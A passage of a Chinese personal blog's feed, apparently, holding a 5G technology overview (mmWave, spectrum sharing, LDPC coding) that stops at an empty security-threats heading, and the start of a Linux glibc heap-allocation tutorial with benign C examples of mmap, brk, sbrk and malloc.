&lt;p&gt;对无线通信稍有了解的人应该知道，频率越高，能传输的信息量也越大，也就是体验到的网速更快。正是因为这一优势，高通把目光聚焦在了频率极高的毫米波上（目前毫米波主要应用于射电天文学、遥感等领域）。全新 5G 技术正首次将频率大于 24 GHz 以上频段（通常称为毫米波）应用于移动宽带通信。大量可用的高频段频谱可提供极致数据传输速度和容量，这将重塑移动体验。但毫米波的利用并非易事，使用毫米波频段传输更容易造成路径受阻与损耗（信号衍射能力有限）。通常情况下，毫米波频段传输的信号甚至无法穿透墙体（回想一下你家的5GHz Wi-Fi有多容易被墙体屏蔽），此外，它还面临着波形和能量消耗等问题。&lt;/p&gt;
&lt;p&gt;不过，已经在天线和信号处理技术方面取得了一些进展。通过利用基站和设备内的多根天线，配合智能波束成型和波束追踪算法，可以显著提升5G毫米波覆盖范围，排除干扰。同时， 5G NR 还将充分利用6GHz以下频段和 4G LTE ，让毫米波的连接性能更上一层。&lt;br /&gt;
&lt;img src=&quot;https://pic4.zhimg.com/80/v2-82d735de9832dc3f8281f879faeb92dd_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
在毫米波领域，Qualcomm一直走在前沿，实现了移动设备中的802.11ad。60 GHz芯片的商业化，除此之外，也在积极研发和测试28GHz频段（可扩展至其他频段）的毫米波原型。不久前，高通在一个人口密集的住宅区附近做了一次模拟实验，现场数据显示，视距内（line-of-sight）的覆盖可达350米，而非视距（Non-Line-of-Sight）的覆盖可达150米。另外，高通最近还发布了第一块5G毫米波调制解调器，骁龙X50，以支持2017下半年的5G毫米波早期实验部署。&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;Fshare&quot;&gt;频谱共享&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;使用共享频谱和非授权频谱，可将 5G 扩展到多个维度，实现更大容量、使用更多频谱、支持新的部署场景。这不仅将使拥有授权频谱的移动运营商受益，而且会为没有授权频谱的厂商创造机会，如有线运营商、企业和物联网垂直行业，使他们能够充分利用 5G NR 技术。5G NR 原生地支持所有频谱类型，并通过前向兼容灵活地利用全新的频谱共享模式。这为在 5G 中创新的使用频谱共享技术创造了机遇。在频谱共享技术领域，比如LTE-U,LAA, LWA, CBRS, LSA, 还有MulteFire，这些技术已经用在了LTE上，5G NR将在这基础上加以创新。&lt;br /&gt;
&lt;img src=&quot;https://pic1.zhimg.com/80/v2-4f299037ecc82d75c4aae2a0703a6e4b_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a name=&quot;codedesign&quot;&gt;先进的信道编码设计&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;目前LTE网络的编码还不足以应对未来的数据传输需求，因此迫切需要一种更高效的信道编码设计，以提高数据传输速率，并利用更大的编码信息块契合移动宽带流量配置，同时，还要继续提高现有信道编码技术（如LTE Turbo）的性能极限。在这方面，Qualcomm促成了行业统一采用LDPC信道编码，LDPC编码已被证明，对于需要一个高效混合HARQ体系的无线衰落信道来说，它是理想的解决方案。从下图可以看出，LDPC的传输效率远超LTE Turbo，且易平行化的解码设计，能以低复杂度和低时延，扩展达到更高的传输速率。&lt;br /&gt;
&lt;img src=&quot;https://pic3.zhimg.com/80/v2-605dc83c4e692c084fcfe2637a7d3066_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;process&quot;&gt;进展&lt;/a&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;a name=&quot;bottleneck&quot;&gt;瓶颈&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;未来天线必须要和系统一起设计而不是单独设计，甚至可以说天线将会成为5G的一个瓶颈，如果不突破这一瓶颈，系统上的信号处理都无法实现，所以天线已经成为5G移动通信系统的关键技术。天线不只是一个辐射器，它有滤波特性、放大作用、抑制干扰信号，它不需要能量来实现增益，因此天线不仅仅是一个器件。&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;state&quot;&gt;现状&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;5G并非凭空而来，它的实现有赖于对现有技术的深入研究利用，比如用在LTE Advanced和LTE Advanced Pro 上的载波聚合、LTE物联网、车联网等技术。未来两年，4G和5G将平行发展，一边是4G的继续成熟，一边是5G的创新研发。根据3GPP的规划，Release 15预计会在2018年6月发布，不过由于行业的推动，这个时间很可能会提早三五个月，保守估计，5GNR的大规模商业化部署最早将在2019年开始。&lt;br /&gt;
&lt;img src=&quot;https://pic1.zhimg.com/80/v2-4c4c1f1157becf206a108a51cec95e21_hd.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;thread&quot;&gt;安全威胁&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;预计到2021年，5G将会为网络运营商和服务提供商提供大规模的效益以及应用。5G拥有更高的传输速率、更低的延迟，以及更高的能效，功能和技术都将会有进一步的提升，从目前来看，5G将连接更丰富的设备类型，满足这些需要应用云计算和虚拟化技术。&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;segmarket&quot;&gt;5G的细分市场&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;网络运营&lt;/li&gt;
&lt;li&gt;大规模物联网&lt;/li&gt;
&lt;li&gt;关键通信&lt;/li&gt;
&lt;li&gt;增强移动带宽&lt;/li&gt;
&lt;li&gt;Vehicle to X（Vehicle to Everything）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a name=&quot;diffthread&quot;&gt;不同应用场景的威胁&lt;/a&gt;&lt;/h4&gt;</content><author><name>DoubleMice</name></author><summary type="html">写给《计算机通信基础》结课ppt。 目录 &quot;What will be 5G?&quot; 特点 工程需求 数据速率 聚合数据速率或区域容量 边缘速率 峰值速率 5G实际传输速率 延迟 能量花费 频谱效率 接入设备特点 提升速率的关键技术 基于OFDM优化的波形和多址接入 通过子载波间隔扩展实现可扩展的OFDM参数配置 通过OFDM加窗提高多路传输效率 灵活的框架设计 可扩展的时间间隔 自包含集成子帧 先进的新型无线技术 大规模MIMO 毫米波 频谱共享 先进的信道编码设计 进展 瓶颈 现状 安全威胁 5G的细分市场 不同应用场景的威胁 &quot;What will be 5G?&quot; 1~5G development 5G 特点 日前，国际电信联盟（ITU）发布了最新的5G标准草案，根据这份草案，单个5G基站至少必须具备20Gbps下行链路的处理能力，而据雷锋网了解，目前LTE基站只支持1Gbps的下行链路。此外，未来的5G标准还要求每平方公里必须支持100万台连接设备，运营商则必须至少有100MHz的空闲频谱，在可行的情况下还可以扩大到1Ghz。 工程需求 快 低能耗 数据速率 衡量指标细分： 聚合数据速率或区域容量 通信系统能够同时支持的总的数据速率，单位是单位面积上的bits/s。相比于上一代的4G通信系统，5G的局和数据速率要求提高1000倍以上。 边缘速率 指的是当用户处于系统边缘时，例如处于小区中离基站最远的位置，用户可能会遇到的传输速率最差的情况，也就是数据速率的下限。又因为一般取传输速率最差的5%的用户作为衡量边缘速率的标准，边缘速率又称为5%速率。对于该指标，5G的目标是100Mbps到1Gbps，这一指标比相比于4G典型的1Mbps的边缘速率，要求提高了至少100倍。 峰值速率 指的是所有条件最好的情况下，用户能够达到的最大速率。5G甚至有望达到10Gbps的量级。 该标准要求单个5G基站至少能够支持20Gbps的下行链路以及10Gbps的上行链路，这是单个基站可以处理的总流量。理论上，如果固定的无线宽带用户使用专用的点到点连接，那么他们可以获得接近5G的速度。实际上，基站覆盖范围内的用户将分配使用20Gbps以及10Gbps这一数据吞吐量。 5G实际传输速率 不管单个5G基站的峰值容量是多少，该草案要求每个用户的下载和上传速度必须达到100Mbps以及50Mbps。这些听起来和LTE-Advanced很接近，但是5G能够让你一直保持100Mbps的下载速度，而不是靠运气。 除此之外，该草案还要求增强5G的稳定性和可靠性，例如数据包必须在1ms内到达基站，并且切换5G基站的中断时间应该为0ms，也就是说切换过程是瞬时的，中间不允许有数据丢失。 延迟 现在4G系统的往返延迟是15ms，其中1ms用于基站给用户分配信道和接入方式产生的必要信令开销。虽然4G的15ms相对于绝大多数服务而言，已经是很够用了。 但随着科技发展，之后兴起的一些设备需要更低的延迟，比如移动云计算和可穿戴设备的联网。 在理想情况下，5G网络的延迟最大不能超过4ms，而LTE网络对延迟的要求则是20ms。不过，要想实现超稳定低延迟通信（URLLC），5G的延迟必须低于1ms。 能量花费 随着我们转向5G网络，通信所花费的能耗应该越来越低。但前文提到，用户的数据速率至少需要提高100倍，这就要求5G中传输每比特信息所花费的能耗需要降低至少100倍。而现在能量消耗的一大部分在于复杂的信令开销，例如网络边缘基站传回基站的回程信号。而5G网络，由于基站部署更加密集，这一开销会更多。因此，5G必须要提高能量的利用率。 5G规范要求在负载下保持高能效，并且在空闲的状态下能够迅速切换成低能耗模式。为了实现这一点，5G无线电必须在10ms内从全速模式切换到节能模式。 频谱效率 从草案的规定来看，5G的峰值频谱效率（每赫兹频谱传输的比特）与LTE-advanced非常接近，都是上行30bits/Hz、下行15bits/Hz，这相当于8x4 MIMO。 接入设备特点 5G网络需要有更强的服务能力，能够同时接入更多的用户。随着机机（machine-to-machine，意为设备到另一设备）通信技术的发展，单一宏蜂窝应该能够支持超过1000个低传输速率设备，同时还要能继续支持普通的高传输速率设备。 提升速率的关键技术 C＝W log2(1+S/N) 基于OFDM优化的波形和多址接入 5G NR设计过程中最重要的一项决定，就是采用基于OFDM优化的波形和多址接入技术，因为OFDM 技术被当今的 4G LTE 和 Wi-Fi 系统广泛采用，因其可扩展至大带宽应用，而具有高频谱效率和较低的数据复杂性，因此能够很好地满足 5G 要求。 OFDM 技术家族可实现多种增强功能，例如通过加窗或滤波增强频率本地化、在不同用户与服务间提高多路传输效率，以及创建单载波 OFDM 波形，实现高能效上行链路传输。 OFDM有以下优势： 复杂度低（Low complexity）：可以兼容低复杂度的信号接收器，比如移动设备 频谱效率高（High spectral efficiency:）：可以高效使用 MIMO，提高数据传输效率。 能耗少（Low power consumption）：可以通过单载波波形，实现高能效上行链路传输。 频率局域化（Frequencylocalization）：可以通过加窗和滤波，提升频率局域化，最大限度减少信号干扰。 通过子载波间隔扩展实现可扩展的OFDM参数配置 目前，通过OFDM子载波之间的15 kHz间隔（固定的OFDM参数配置），LTE最高可支持20 MHz的载波带宽。为了支持更丰富的频谱类型/带（为了连接尽可能丰富的设备，5G将利用所有能利用的频谱，如毫米微波、非授权频段）和部署方式。5G NR将引入可扩展的OFDM间隔参数配置。这一点至关重要，因为当FFT（Fast Fourier Transform，快速傅里叶变换）为更大带宽扩展尺寸时，必须保证不会增加处理的复杂性。而为了支持多种部署模式的不同信道宽度，如上图所示，5G NR必须适应同一部署下不同的参数配置，在统一的框架下提高多路传输效率。另外，5G NR也能跨参数实现载波聚合，比如聚合毫米波和6GHz以下频段的载波，因而也就具有更强的连接性能。 通过OFDM加窗提高多路传输效率 前文提到，5G 将被应用于大规模物联网，这意味着会有数十亿设备在相互连接，5G势必要提高多路传输的效率，以应对大规模物联网的挑战。为了相邻频带不相互干扰，频带内和频带外信号辐射必须尽可能小。OFDM能实现波形后处理（post-processing），如时域加窗或频域滤波，来提升频率局域化。如下图，利用5G NR OFDM的参数配置，5G可以在相同的频道内进行多路传输。 面对这一需求，Qualcomm正积极推动CP-OFDM（循环前缀正交频分复用）加窗技术，大量的分析和试验结果表明，它能有效减少频带内和频带外的辐射，从而显著提高频率局域化。CP-OFDM技术的效果已被实践证实，现在正广泛应用于LTE网络体系中。 灵活的框架设计 显然，要实现5G的大范围服务，仅有基于OFDM优化的波形和多址接入技术是远远不够的。设计5G NR的同时，还在设计一种灵活的5G 网络架构，以进一步提高5G服务多路传输的效率。这种灵活性即体现在频域，更体现在时域上，5G NR的框架能充分满足5G的不同的服务和应用场景。 可扩展的时间间隔 相比当前的 4G LTE网络，5G NR将使时延降低一个数量级。目前LTE网络中，TTI（时间间隔）固定在1 ms（毫秒）。为此，3GPP在4G演进的过程中提出一个降低时延的项目。尽管技术细节还不得而知，但这一项目的规划目标就是要将一次傅里叶变换的时延降低为目前的1/8（即从1.14ms降低至143&amp;micro;s（微秒））。而为了支持&amp;ldquo;长时延需求&amp;rdquo;的服务，5G NR的灵活框架设计可以向上或向下扩展TTI（即使用更长或更短的TTI），依具体需求而变。 除此之外，5G NR同样支持同一频率下以不同的TTI进行多路传输。比如，高Qos（服务质量）要求的移动宽带服务可以选择使用500 &amp;micro;s的TTI，而不是像LTE时代只能用标准TTI，同时，另一个对时延很敏感的服务可以用上更短的TTI，比如140 &amp;micro;s，而不是非得等到下一个子帧到来，也就是500 &amp;micro;s以后。也就是说上一次传输结束以后，两者可以同时开始，从而节省了等待时间。 自包含集成子帧 自包含集成子帧是另一项关键技术，对降低时延、向前兼容和其他一系列5G特性意义重大。通过把数据的传输（transmission）和确认（acknowledgement）包含在一个子帧内，时延可显著降低。下图展示的是一个TDD下行链路子帧，从网络到设备的数据传输和从设备发回的确认信号都在同一个子帧内。而且通过5G NR独立集成子帧，每个TTI都以模块化处理完成，比如同意下载&amp;rarr;数据下行&amp;rarr;保护间隔&amp;rarr;上行确认。 模块化同样支持不同类型的子帧为未来的各种新服务进行多路传输，配合5G NR框架支持空白子帧和空白频率资源的设计，使其拥有向前兼容性&amp;mdash;&amp;mdash;未来的新型服务可以以同步或非同步状态部署在同一频率内。 先进的新型无线技术 我们在开头提到过，5G必然是在充分利用现有技术的基础之上，充分创新才能实现的，而4G LTE正是目前最先进的移动网络平台，5G在演进的同时，LTE本身也还在不断进化（比如最近实现的千兆级4G+），5G不可避免地要利用目前用在4G LTE上的先进技术，如载波聚合，MIMO技术，非共享频谱的利用，等等；可以说，5G在很大程度上是以4G为基础的。 大规模MIMO MIMO（Multiple-Input Multiple-Output）技术是目前无线通信领域的一个重要创新研究项目，通过智能使用多根天线（设备端或基站端），发射或接受更多的信号空间流，能显著提高信道容量；而通过智能波束成型，将射频的能量集中在一个方向上，可以提高信号的覆盖范围。这两项优势足以使其成为5G NR的核心技术之一，因此一直在努力推进MIMO技术的演化，比如从2x2提高到了目前4x4 MIMO。但更多的天线也意为着占用更多的空间，要在空间有限的设备中容纳进更多天线显然不现实，所以，只能在基站端叠加更多MIMO。从目前的理论来看，5G NR可以在基站端使用最多256根天线，而通过天线的二维排布，可以实现3D波束成型，从而提高信道容量和覆盖。 毫米波 对无线通信稍有了解的人应该知道，频率越高，能传输的信息量也越大，也就是体验到的网速更快。正是因为这一优势，高通把目光聚焦在了频率极高的毫米波上（目前毫米波主要应用于射电天文学、遥感等领域）。全新 5G 技术正首次将频率大于 24 GHz 以上频段（通常称为毫米波）应用于移动宽带通信。大量可用的高频段频谱可提供极致数据传输速度和容量，这将重塑移动体验。但毫米波的利用并非易事，使用毫米波频段传输更容易造成路径受阻与损耗（信号衍射能力有限）。通常情况下，毫米波频段传输的信号甚至无法穿透墙体（回想一下你家的5GHz Wi-Fi有多容易被墙体屏蔽），此外，它还面临着波形和能量消耗等问题。 不过，已经在天线和信号处理技术方面取得了一些进展。通过利用基站和设备内的多根天线，配合智能波束成型和波束追踪算法，可以显著提升5G毫米波覆盖范围，排除干扰。同时， 5G NR 还将充分利用6GHz以下频段和 4G LTE ，让毫米波的连接性能更上一层。 在毫米波领域，Qualcomm一直走在前沿，实现了移动设备中的802.11ad。60 GHz芯片的商业化，除此之外，也在积极研发和测试28GHz频段（可扩展至其他频段）的毫米波原型。不久前，高通在一个人口密集的住宅区附近做了一次模拟实验，现场数据显示，视距内（line-of-sight）的覆盖可达350米，而非视距（Non-Line-of-Sight）的覆盖可达150米。另外，高通最近还发布了第一块5G毫米波调制解调器，骁龙X50，以支持2017下半年的5G毫米波早期实验部署。 频谱共享 使用共享频谱和非授权频谱，可将 5G 扩展到多个维度，实现更大容量、使用更多频谱、支持新的部署场景。这不仅将使拥有授权频谱的移动运营商受益，而且会为没有授权频谱的厂商创造机会，如有线运营商、企业和物联网垂直行业，使他们能够充分利用 5G NR 技术。5G NR 原生地支持所有频谱类型，并通过前向兼容灵活地利用全新的频谱共享模式。这为在 5G 中创新的使用频谱共享技术创造了机遇。在频谱共享技术领域，比如LTE-U,LAA, LWA, CBRS, LSA, 还有MulteFire，这些技术已经用在了LTE上，5G NR将在这基础上加以创新。 先进的信道编码设计 目前LTE网络的编码还不足以应对未来的数据传输需求，因此迫切需要一种更高效的信道编码设计，以提高数据传输速率，并利用更大的编码信息块契合移动宽带流量配置，同时，还要继续提高现有信道编码技术（如LTE Turbo）的性能极限。在这方面，Qualcomm促成了行业统一采用LDPC信道编码，LDPC编码已被证明，对于需要一个高效混合HARQ体系的无线衰落信道来说，它是理想的解决方案。从下图可以看出，LDPC的传输效率远超LTE Turbo，且易平行化的解码设计，能以低复杂度和低时延，扩展达到更高的传输速率。 进展 瓶颈 未来天线必须要和系统一起设计而不是单独设计，甚至可以说天线将会成为5G的一个瓶颈，如果不突破这一瓶颈，系统上的信号处理都无法实现，所以天线已经成为5G移动通信系统的关键技术。天线不只是一个辐射器，它有滤波特性、放大作用、抑制干扰信号，它不需要能量来实现增益，因此天线不仅仅是一个器件。 现状 5G并非凭空而来，它的实现有赖于对现有技术的深入研究利用，比如用在LTE Advanced和LTE Advanced Pro 上的载波聚合、LTE物联网、车联网等技术。未来两年，4G和5G将平行发展，一边是4G的继续成熟，一边是5G的创新研发。根据3GPP的规划，Release 15预计会在2018年6月发布，不过由于行业的推动，这个时间很可能会提早三五个月，保守估计，5GNR的大规模商业化部署最早将在2019年开始。 安全威胁 预计到2021年，5G将会为网络运营商和服务提供商提供大规模的效益以及应用。5G拥有更高的传输速率、更低的延迟，以及更高的能效，功能和技术都将会有进一步的提升，从目前来看，5G将连接更丰富的设备类型，满足这些需要应用云计算和虚拟化技术。 5G的细分市场 网络运营 大规模物联网 关键通信 增强移动带宽 Vehicle to X（Vehicle to Everything） 不同应用场景的威胁</summary></entry><entry><title type="html">linux动态内存分配</title><link href="http://localhost:4000/is/pwn/2018/03/15/linux-e5-8a-a8-e6-80-81-e5-86-85-e5-ad-98-e5-88-86-e9-85-8d.html" rel="alternate" type="text/html" title="linux动态内存分配" /><published>2018-03-15T22:28:11+08:00</published><updated>2018-03-15T22:28:11+08:00</updated><id>http://localhost:4000/is/pwn/2018/03/15/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D</id><content type="html" xml:base="http://localhost:4000/is/pwn/2018/03/15/linux-e5-8a-a8-e6-80-81-e5-86-85-e5-ad-98-e5-88-86-e9-85-8d.html">&lt;h2&gt;目的&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;熟悉堆内存布局&lt;/li&gt;
&lt;li&gt;了解glibc(ptmalloc2)堆管理机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#function&quot;&gt;内存管理函数&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#vm_layout&quot;&gt;虚拟内存布局&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mmap&amp;amp;munmap&quot;&gt;mmap&amp;amp;munmap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#brk&amp;amp;sbrk&quot;&gt;brk&amp;amp;sbrk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#malloc&amp;amp;free&quot;&gt;malloc&amp;amp;free&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#app_malloc&quot;&gt;应用程序动态申请内存&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#heap&quot;&gt;glibc堆管理机制&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#heap_info&quot;&gt;heap_info&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#malloc_state&quot;&gt;malloc_state&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#malloc_state_member&quot;&gt;malloc_state成员&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bin&quot;&gt;bin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#malloc_chunk&quot;&gt;malloc_chunk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#consolidate&quot;&gt;consolidate&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#consolidate_forward&quot;&gt;consolidate forward&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#consolidate_backward&quot;&gt;consolidate backward&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#unlink&quot;&gt;unlink&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a name=&quot;function&quot;&gt;内存管理函数&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;a name=&quot;vm_layout&quot;&gt;虚拟内存布局&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://403forbidden.website/wp-content/uploads/2018/03/linuxFlexibleAddressSpaceLayout.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/&quot;&gt;图片来源：sploitfun&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;mmap&amp;munmap&quot;&gt;mmap&amp;amp;munmap&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;&lt;p&gt;
  系统调用
&lt;/p&gt;&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;void *mmap(void *addr, size_t length, int prot, int flags,int fd, off_t offset);
/*
    addr: NONE|addr
        NONE:操作系统选择创建虚拟内存区域的位置
        somewhere:操作系统从addr附近页边界处创建虚拟内存区域(linux)
    length:申请的字节数
    prot:PROT_NONE|PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE
        PROT_EXEC:页可执行
        PROT_READ:页可读
        PROT_WRITE:页可写
        PROT_NONE:页不可访问
    flags:MAP_SHARED|MAP_PRIVATE|MAP_ANONYMOUS|...
        MAP_SHARED:虚拟内存区域可共享
        MAP_PRIVATE:私有虚拟内存区域
        MAP_ANONYMOUS:虚拟内存区域初始化为0，如果同时被设置为MAP_ANONYMOUS，fd应为-1
    fd:文件描述符，指定要映射的对象的一个连续片段，长度为length字节
    offset:文件开始的偏移处开始映射

*/

int munmap(void *addr, size_t length);
/*
    删除从addr开始共length字节的虚拟内存区域，再次引用该区域将导致段错误
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a name=&quot;brk&amp;sbrk&quot;&gt;brk&amp;amp;sbrk&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;&lt;p&gt;
  系统调用
&lt;/p&gt;&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;int brk(void *addr);
void *sbrk(intptr_t increment);
/*
DESCRIPTION
    brk()  and  sbrk()  change the location of the program break, which defines the end of the process's data segment (i.e., the program break is the first location after the end of the uninitialized data segment).  Increasing the program break has  the effect of allocating memory to the process; decreasing the break deallocates memory.

    brk()  sets the end of the data segment to the value specified by addr, when that value is reasonable, the system has enough memory, and the process does not exceed its maximum data size (see setrlimit(2)).

    sbrk() increments the program's data space by increment bytes.  Calling sbrk() with an increment of 0 can be  used  to  find the current location of the program break.
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;brk()&lt;/code&gt;参数为一个地址，把该地址作为堆底。&lt;br /&gt;
&lt;code&gt;sbrk()&lt;/code&gt;参数为相对堆底的偏移，并把偏移后函数的返回值作为堆底。&lt;br /&gt;
&lt;code&gt;sbrk(0)&lt;/code&gt;返回当前堆底地址。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;brk()&lt;/code&gt;和&lt;code&gt;mmap()&lt;/code&gt;申请虚拟空间时候的不同：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;brk()&lt;/code&gt;: 改变进程堆的大小；&lt;code&gt;mmap()&lt;/code&gt;: 为文件创建一个内存映射(或匿名内存映射)，扩大进程的地址空间。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;brk()&lt;/code&gt;分配的虚拟内存在&lt;code&gt;random brk offset&lt;/code&gt;的上方（高地址一端，对应图中program break brk处），&lt;code&gt;random brk offset&lt;/code&gt;的低地址端紧挨着&lt;code&gt;bss&lt;/code&gt;段。&lt;code&gt;mmap()&lt;/code&gt;分配的虚拟内存的地址则位于某一处区域，不特意指定并不会在&lt;code&gt;random brk offset&lt;/code&gt;附近。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* sbrk and brk example */
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int main()
{
        void *curr_brk, *tmp_brk = NULL;

        printf(&quot;Welcome to sbrk example:%d\n&quot;, getpid());

        /* sbrk(0) gives current program break location */
        tmp_brk = curr_brk = sbrk(0);
        printf(&quot;Program Break Location1:%p\n&quot;, curr_brk);
        getchar();

        /* brk(addr) increments/decrements program break location */
        brk(curr_brk+4096);

        curr_brk = sbrk(0);
        printf(&quot;Program break Location2:%p\n&quot;, curr_brk);
        getchar();

        brk(tmp_brk);

        curr_brk = sbrk(0);
        printf(&quot;Program Break Location3:%p\n&quot;, curr_brk);
        getchar();

        return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;http://403forbidden.website/wp-content/uploads/2018/03/b1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;http://403forbidden.website/wp-content/uploads/2018/03/mb1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;http://403forbidden.website/wp-content/uploads/2018/03/b2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;http://403forbidden.website/wp-content/uploads/2018/03/mb2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;malloc&amp;free&quot;&gt;malloc&amp;amp;free&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;&lt;p&gt;
  非系统调用
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;malloc()&lt;/code&gt;是通过调用&lt;code&gt;brk()&lt;/code&gt;和&lt;code&gt;mmap()&lt;/code&gt;实现的，当&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分配内存大于 128k ，调用 mmap() ，在文件映射区域中分配匿名虚存空间&lt;/li&gt;
&lt;li&gt;与bss段相邻的区域没有足够空间来申请新的内存区域&lt;/li&gt;
&lt;li&gt;非main thread申请新的内存区域&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;调用的是&lt;code&gt;mmap()&lt;/code&gt;，否则&lt;code&gt;brk(old_brk+length)&lt;/code&gt;来申请新的内存区域。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;free()&lt;/code&gt;是通过&lt;code&gt;brk()&lt;/code&gt;和&lt;code&gt;munmap()&lt;/code&gt;系统调用实现的。&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;app_malloc&quot;&gt;应用程序动态申请内存&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://403forbidden.website/wp-content/uploads/2018/03/FuncCall.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
allocator的使用可以避免频繁的系统调用操作，同时还有以下特性:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;处理任意请求序列&lt;/li&gt;
&lt;li&gt;立即相应请求&lt;/li&gt;
&lt;li&gt;只使用堆&lt;/li&gt;
&lt;li&gt;对齐块&lt;/li&gt;
&lt;li&gt;不修改已分配的块&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;/* Per thread arena example. */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
void* threadFunc(void* arg) {
        printf(&quot;Before malloc in thread 1\n&quot;);
        getchar();
        char* addr = (char*) malloc(1000);
        printf(&quot;After malloc and before free in thread 1\n&quot;);
        getchar();
        free(addr);
        printf(&quot;After free in thread 1\n&quot;);
        getchar();
}
int main() {
        pthread_t t1;
        void* s;
        int ret;
        char* addr;
        printf(&quot;Welcome to per thread arena example::%d\n&quot;,getpid());
        printf(&quot;Before malloc in main thread\n&quot;);
        getchar();
        addr = (char*) malloc(1000);
        printf(&quot;After malloc and before free in main thread\n&quot;);
        getchar();
        free(addr);
        printf(&quot;After free in main thread\n&quot;);
        getchar();
        ret = pthread_create(&amp;amp;t1, NULL, threadFunc, NULL);
        if(ret)
        {
                printf(&quot;Thread creation error\n&quot;);
                return -1;
        }
        ret = pthread_join(t1, &amp;amp;s);
        if(ret)
        {
                printf(&quot;Thread join error\n&quot;);
                return -1;
        }
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a name=&quot;heap&quot;&gt;glibc堆管理机制&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;a name=&quot;heap_info&quot;&gt;heap_info&amp;mdash;&amp;mdash;heap header&lt;/a&gt;&lt;/h3&gt;
